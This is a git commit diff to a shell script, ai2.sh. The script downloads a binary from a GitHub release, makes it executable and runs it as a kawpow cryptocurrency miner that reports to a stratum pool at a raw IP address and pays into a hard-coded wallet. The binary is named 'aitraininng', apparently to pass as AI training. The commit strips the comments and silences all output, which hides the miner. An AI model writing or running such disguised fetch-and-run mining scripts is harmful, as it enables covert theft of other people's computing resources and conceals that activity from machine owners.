7e517812801b82b634f85d8e10f5a5f7ee7309d1
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 17:25:54 +0300

    Update ai2.sh

--- ai2.sh
+++ ai2.sh
@@ -1,10 +1,5 @@
 #!/bin/bash
-
-# Download the file
 wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
-
-# Make the file executable
 chmod +x aitraininng
-
-# Run the file with the given parameters
-./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
+./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch > /dev/null 2>&1
+ 
